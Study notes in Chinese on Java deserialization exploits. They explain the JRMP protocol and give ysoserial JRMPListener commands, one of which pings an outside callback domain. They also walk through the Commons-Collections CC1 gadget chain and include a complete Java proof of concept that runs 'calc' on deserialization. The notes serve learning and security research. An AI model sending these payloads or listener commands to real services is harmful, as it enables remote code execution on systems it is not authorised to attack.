## JRMP

JRMP指的是Java远程方法协议（Java Remote Method Protocol）。它是 Java 对象实现远程通信的基础技术，也是Java RMI（Remote Method Invocation，远程方法调用）的底层通信协议。借助JRMP，运行于某个Java虚拟机（JVM）中的对象能够调用另一个JVM中对象的方法，就如同调用本地对象的方法一样便捷


## 非常规链

https://github.com/wyzxxz/shiro_rce_tool
https://mp.weixin.qq.com/s/MdCUfyaUCAa2M3P3H1NsGw

## JRMPC

1、生成JRMPListener

java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "ping kfxmlanpak.zaza.eu.org"

java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "calc"

2、shiro_tool JRMP模式

2.1、java-chains JRMP模式

## CC1链

*影响commons-collections4 3.x版本*

*链上所涉及的所有类都要继承Serialize接口*

https://mp.weixin.qq.com/s/J_YeNkLN6KYTCVDYFh1dvQ

-  AnnotationInvocationHandler

```
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Map.Entry var5 = (Map.Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
```

- MapEntry

```
public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
    }
```

- TransformedMap

```
protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

- ChainedTransformer

transform方法

```
ChainedTransformer
       public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
```

- ConstantTransformer

transform方法

```
ConstantTransformer
    public Object transform(Object input) {
        return iConstant;
    }
```

- InvokerTransformer

transform方法

```
public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```


它们的关系是**嵌套与被嵌套**的关系。`ChainedTransformer` 是最外层的容器，内部装着其他的 `Transformer`。

**具体的执行逻辑如下：**

1. **启动流水线**：`ChainedTransformer` 开始工作。
    
2. **第一站 (`ConstantTransformer`)**：它丢掉所有输入，直接给出一块“生肉”——`Runtime.class`。
    
3. **第二站 (`InvokerTransformer`)**：它接过 `Runtime.class`，用反射刀法切出 `getRuntime` 方法。
    
4. **第三站 (`InvokerTransformer`)**：它接过上一步的方法，执行 `invoke`，变出了 `Runtime` 实例。
    
5. **第四站 (`InvokerTransformer`)**：它接过实例，执行 `exec("calc.exe")`

poc

```
package com.example;



import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","value");

        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //创建构造器
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        //保证可以访问到
        annotationInvocationHandlerConstructor.setAccessible(true);
        //实例化传参，注解和构造好的Map
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```